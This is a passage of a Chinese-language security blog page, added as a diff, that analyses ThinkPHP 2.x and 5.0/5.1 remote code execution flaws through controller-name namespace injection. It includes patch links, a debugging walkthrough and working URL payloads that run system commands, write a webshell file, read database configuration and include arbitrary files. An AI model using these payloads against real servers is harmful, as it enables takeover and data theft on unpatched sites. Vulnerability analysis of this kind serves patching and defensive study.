@@ -1,0 +1,1000 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="John Doe" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="A hexo theme." />
+  
+  
+  
+  <title>
+    
+      ThinkPHP框架默认RCE漏洞分析 
+      
+      
+      |
+    
+     Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/css/math/katex.min.css">
+
+<link rel="stylesheet" href="/css/math/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">CyxSec</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">ThinkPHP框架默认RCE漏洞分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-08-16 10:34:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/ThinkPHP/" title="ThinkPHP">
+                    #ThinkPHP
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="0x00-启"><a class="markdownIt-Anchor" href="#0x00-启"></a> 0x00 启</h1>
+<p>黑盒debug开启会报错出具体版本</p>
+<p>白盒看本地tp代码</p>
+<p>tp3 在目录的ThinkPHP文件中</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240716150129242.png" alt="image-20240716150129242" /></p>
+<p>TP5.0在目录的base.php文件中 : thinkphp/base.php</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240716165942332.png" alt="image-20240716165942332" /></p>
+<p>TP5.1: thinkphp/library/think/App.php</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725155723023.png" alt="image-20240725155723023" /></p>
+<h1 id="0x01-thinkphp-2x-命令执行"><a class="markdownIt-Anchor" href="#0x01-thinkphp-2x-命令执行"></a> 0x01 ThinkPHP 2.x 命令执行</h1>
+<p>PHP5的preg_replace的/e模式的命令执行</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240716155011163.png" alt="image-20240716155011163" /></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'正则规则'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'替换字符'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'目标字符'</span><span class="token punctuation">)</span>
+    正则规则使用e修饰时，如果从目标字符匹配到正则规则，那么替换字符的php语句就会执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>这个分析过程参考这篇文章即可，实战几乎没遇见过TP2，以后有空再分析吧：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/people/223149.html">https://www.freebuf.com/articles/people/223149.html</a></p>
+<h1 id="0x02-thinkphp-5x-命令执行兼容模式支持实例化任意控制器导致rce"><a class="markdownIt-Anchor" href="#0x02-thinkphp-5x-命令执行兼容模式支持实例化任意控制器导致rce"></a> 0x02 ThinkPHP 5.x 命令执行（兼容模式支持实例化任意控制器导致RCE）</h1>
+<h2 id="1影响版本"><a class="markdownIt-Anchor" href="#1影响版本"></a> 1.影响版本</h2>
+<p>ThinkPHP v5.0.x &lt;=x&lt;= 5.0.22</p>
+<p>ThinkPHP v5.1.x &lt;=x&lt;= 5.1.30</p>
+<p>patch方式：</p>
+<p>添加正则判断controller名</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p>
+<p>5.0<img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240716162407625.png" alt="image-20240716162407625" /></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p>
+<p>5.1</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725151852349.png" alt="image-20240725151852349" /></p>
+<h2 id="2漏洞分析"><a class="markdownIt-Anchor" href="#2漏洞分析"></a> 2.漏洞分析</h2>
+<p>本地调试环境版本为5.0.22</p>
+<p>补丁判断了控制器只允许有字母数字</p>
+<p>先跟一下5.0.22的$controller都做了什么</p>
+<p>访问index.php</p>
+<ul>
+<li>因为没有传入控制器，默认的控制器是Index</li>
+<li>默认配置$convert为true，会将控制器名小写处理</li>
+</ul>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723173927452.png" alt="image-20240723173927452" /></p>
+<p><strong>分析流程：</strong></p>
+<ol>
+<li>进入下方的parseName静态方法</li>
+</ol>
+<ul>
+<li>做的是名称风格转换，就是驼峰、首字母大写和蛇形的编码名称的转换，不是核心问题</li>
+</ul>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723174505492.png" alt="image-20240723174147581" /></p>
+<ol start="2">
+<li>进入下方的操作$controller变量的位置，跟入Loader的controller静态方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724175539279.png" alt="image-20240724175539279" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723174521168.png" alt="image-20240723174521168" /></p>
+<ol start="3">
+<li>看注释发现是实例化控制器的，传入的形参为$name，跟入下方的getModuleAndClass静态方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723174847375.png" alt="image-20240723174847375" /></p>
+<ol start="4">
+<li>两个if，第一个判断传入的控制器名字是否包含’\‘字符，不包含的话会走下面的else，下面会判断是否存在’/‘字符，存在会按照’/'字符分割返回。</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723175203807.png" alt="image-20240723175203807" /></p>
+<ol start="5">
+<li>跟入下方赋值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant="normal">的</mi><mi>p</mi><mi>a</mi><mi>r</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">法</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">得</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">class的parseClass方法，参数为我们上面取得的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">的</span></span></span></span>module和$name（控制器名称）</li>
+</ol>
+<p>关注下下面做了什么</p>
+<ul>
+<li>替换name中的/和. 再按照字符划分为数组</li>
+<li>parseName我们上面分析过，是做名称转换的（驼峰、首字母大写和蛇形），返回数组最后一个元素</li>
+<li>根据配置，看后缀是否配置，将后缀拼接到$class名字中</li>
+<li>将去掉最后元素的原始数组拼接回字符</li>
+</ul>
+<p>返回值：返回命名空间+模块+层名+类名+类名后缀</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723181604729.png" alt="image-20240723181604729" /></p>
+<p>最终返回数组</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723182451423.png" alt="image-20240723182451423" /></p>
+<ol start="6">
+<li>回到上面的loader的静态方法controller中，获取返回值后，会调用invokeClass方法，这个看起来就是实例化类的方法， 跟入</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723182537533.png" alt="image-20240723182537533" /></p>
+<p>果然是反射实例化类</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723182700386.png" alt="image-20240723182700386" /></p>
+<ol start="7">
+<li>实例化后，发现还会获取当前的action参数，并调用实例化类的对应方法</li>
+</ol>
+<p>这里的action与上面的controller获取方式类似</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723182955473.png" alt="image-20240723182955473" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723182833361.png" alt="image-20240723182833361" /></p>
+<p>整个功能就跟完了，我们发现最后是实例化命名空间类，并调用了对应的方法，盲猜一下这是一个可以实例化任意方法的漏洞， 我们跟一下传入的参数是不是可控，返回命名空间和方法的参数是否可以调用到我们想实现的方法。</p>
+<p>传入的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">模</mi><mi mathvariant="normal">块</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">制</mi><mi mathvariant="normal">器</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">操</mi><mi mathvariant="normal">作</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">由</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">图</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">知</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">result参数为模块/控制器/操作，传入值可控。由上图可知，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">块</span><span class="mord">/</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">器</span><span class="mord">/</span><span class="mord cjk_fallback">操</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">图</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">，</span></span></span></span>action为传入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi mathvariant="normal">切</mi><mi mathvariant="normal">割</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">第</mi><mi mathvariant="normal">三</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">元</mi><mi mathvariant="normal">素</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">为</mi></mrow><annotation encoding="application/x-tex">result切割数组的第三个元素，类名为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">切</span><span class="mord cjk_fallback">割</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">三</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">为</span></span></span></span>instance参数，跟一下这个值的产生即可，</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724174443495.png" alt="image-20240724174443495" /></p>
+<p><strong>利用流程：</strong></p>
+<ol>
+<li>看回分析流程的第2步，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">controller变量是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">是</span></span></span></span>result切割数组的第二个元素，跟入第3步方法，返回值取决于这个$class值</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724175721587.png" alt="image-20240724175721587" /></p>
+<ol start="2">
+<li>重点在getModuleAndClass静态方法，关注返回的$class。</li>
+</ol>
+<p>看回分析流程的第4步，$class的赋值只有两处：</p>
+<ul>
+<li>第一处逻辑是如果name中包含\，直接返回name做class</li>
+<li>第二处的逻辑我们在第5步分析了，返回值是拼接的，且开头的命名空间为App::$namespace，限制较高</li>
+</ul>
+<p>这样来看我们要让传入的name参数包含\，name实际上就是我们最开始获取的$controller方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724180055811.png" alt="image-20240724180055811" /></p>
+<p>分析后就很简单了</p>
+<p>我们传入的格式是：模块/控制器/操作，控制器这里我们要传入字符包含\，这样最终处理后就能直接初始化我们想要的class。而\在tp有额外的”命名空间的含义“，这样也就达成了可以初始化任意类的目的</p>
+<p>我们先测试传入index/a\b/1</p>
+<p>发现无法解析\，服务端当作了/处理</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724181057139.png" alt="image-20240724181057139" /></p>
+<p>但是tp默认支持多种路由方式，可以使用参数的形式传入</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724181538375.png" alt="image-20240724181538375" /></p>
+<p>接下来改一下传参方式：<a target="_blank" rel="noopener" href="http://tp5022.com/index.php/?s=index/a%5Cb/%E5%8F%91%E7%8E%B0%E6%9E%9C%E7%84%B6%E5%A6%82%E6%88%91%E4%BB%AC%E6%89%80%E6%96%99%EF%BC%8Cclass%E5%90%8D%E7%A7%B0%E6%88%91%E4%BB%AC%E7%8E%B0%E5%9C%A8%E5%8F%AF%E6%8E%A7%E4%BA%86%E3%80%82">http://tp5022.com/index.php/?s=index/a\b/发现果然如我们所料，class名称我们现在可控了。</a></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724181836353.png" alt="image-20240724181836353" /></p>
+<p>我们找一下内部存在的类测试一下：/index/think\app/index</p>
+<p>发现类成功进行了初始化，爆错提示方法不存在而已</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724182230104.png" alt="image-20240724182230104" /></p>
+<p>这个漏洞到此也就分析成功，内部逻辑缺陷，导致可以用命名空间的方式来调用任意类的任意方法。</p>
+<p><strong>至于为什么ThinkPHP可以使用命名空间直接实例化，可以看这篇文章：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000020172925">https://segmentfault.com/a/1190000020172925</a></p>
+<p>简单总结就是：正常我们需要include，然后才能尝试实例化，而在tp中，实例化是有如下流程的：</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725113342175.png" alt="image-20240725113342175" /></p>
+<p>文中也举例了（如下图），实际上TP默认维护了绑定映射关系，think就是一个根命名空间，其对应的初始命名空间目录就是系统的类库目录（thinkphp/library/think）</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725113510376.png" alt="image-20240725113510376" /></p>
+<h2 id="3漏洞利用"><a class="markdownIt-Anchor" href="#3漏洞利用"></a> 3.漏洞利用</h2>
+<p>经过上面的分析，依托TP的命名空间和自动类加载的机制，我们已经获取了实例化任意类的入口，接下来就是看一下TP框架本身哪些方法可以被利用了。</p>
+<h3 id="31遇见问题"><a class="markdownIt-Anchor" href="#31遇见问题"></a> 3.1遇见问题</h3>
+<p>我们在tp找到了一个文件写入类，命名空间应该为：<strong>\think\template\driver\File</strong></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725140912344.png" alt="image-20240725140912344" /></p>
+<p>使用payload打一下发现提示控制器不存在，观察一下， 发现控制器的file变成了小写，难怪找不到这个File类</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725141123558.png" alt="image-20240725141123558" /></p>
+<p>分析了一下相关大小写相关代码</p>
+<ol>
+<li>发现最初获取控制器名就会转换成小写。</li>
+</ol>
+<p>配置里的url_convert还为true，默认就会转成小写。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725141452713.png" alt="image-20240725141452713" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725141402353.png" alt="image-20240725141402353" /></p>
+<ol start="2">
+<li>上面提到的tp会根据命名空间自动寻找对应的类，<code>\think\Loader::autoload</code></li>
+</ol>
+<p>其中有一段非Win环境不严格区分大小写，是windows无法走到下面的include，也就没办法包含到文件</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725141739998.png" alt="image-20240725141739998" /></p>
+<h3 id="32漏洞利用总结"><a class="markdownIt-Anchor" href="#32漏洞利用总结"></a> 3.2漏洞利用总结</h3>
+<h4 id="tp-50x-version-5022"><a class="markdownIt-Anchor" href="#tp-50x-version-5022"></a> TP 5.0.x &lt;=version&lt;= 5.0.22</h4>
+<p>由上面的问题，简单跟了一下发现在windows环境下自动加载类根本无法加载到想要类文件，所以只能找框架初始化的时候就已经加载的类。</p>
+<p>在Linux一样如此，处理小写的控制器，拼接文件名还是小写，虽然走到了下面的include，但是因为Linux文件名区分大小写，无法包含到。</p>
+<pre class="line-numbers language-none"><code class="language-none">think\Route
+think\Config
+think\Error
+think\App
+think\Request
+think\Hook
+think\Env
+think\Lang
+think\Log
+think\Loader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现可以执行任意方法，且可以执行带参数的方法。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725145500102.png" alt="image-20240725145500102" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725150328217.png" alt="image-20240725150328217" /></p>
+<p><strong>最终可用payload：</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">s<span class="token operator">=</span><span class="token operator">/</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>var_dump<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123123</span> <span class="token comment"># 打印的方式检测漏洞</span>
+<span class="token operator">?</span>s<span class="token operator">=</span><span class="token operator">/</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>file_put_contents<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>shell1213<span class="token operator">.</span>php<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123123</span> <span class="token comment"># 文件写入</span>
+<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\config<span class="token operator">/</span>get<span class="token operator">&amp;</span>name<span class="token operator">=</span>database<span class="token operator">.</span>username <span class="token comment"># 获取配置信息</span>
+<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Lang<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>test<span class="token operator">.</span>jpg    <span class="token comment"># 包含任意文件</span>
+<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Config<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>t<span class="token operator">.</span>php     <span class="token comment"># 包含任意.php文件</span>
+<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>id  <span class="token comment">#执行系统命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="tp-51x-version-5130"><a class="markdownIt-Anchor" href="#tp-51x-version-5130"></a> TP 5.1.x &lt;=version&lt;= 5.1.30</h4>
+<p>5.1的具体漏洞分析流程就不分析了，大致与5.0相似，虽然相似度不高，但是直接往下跟控制器的赋值就行了</p>
+<p>上面5.0遇到的问题，在5.1存在吗？看一下两处的代码：</p>
+<ul>
+<li>获取控制器部分</li>
+</ul>
+<p>默认对获取的值也是会小写的</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725164747021.png" alt="image-20240725164747021" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725164730640.png" alt="image-20240725164730640" /></p>
+<ul>
+<li>类自动加载部分</li>
+</ul>
+<p>逻辑与5.0相同，写法，但还是无法加载</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725164906870.png" alt="image-20240725164906870" /></p>
+<p>只能寻找初始化时已经加载（include）的类</p>
+<pre class="line-numbers language-none"><code class="language-none">think\Loader 
+Composer\Autoload\ComposerStaticInit289837ff5d5ea8a00f5cc97a07c04561
+think\Error 
+think\Container
+think\App 
+think\Env 
+think\Config 
+think\Hook 
+think\Facade
+think\facade\Env
+env
+think\Db
+think\Lang 
+think\Request 
+think\Log 
+think\log\driver\File
+think\facade\Route
+route
+think\Route 
+think\route\Rule
+think\route\RuleGroup
+think\route\Domain
+think\route\RuleItem
+think\route\RuleName
+think\route\Dispatch
+think\route\dispatch\Url
+think\route\dispatch\Module
+think\Middleware
+think\Cookie
+think\View
+think\view\driver\Think
+think\Template
+think\template\driver\File
+think\Session
+think\Debug
+think\Cache
+think\cache\Driver
+think\cache\driver\File<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现**\think\template\driver\File**类在5.1已经在初始化时就已经加载，所以可以使用。</p>
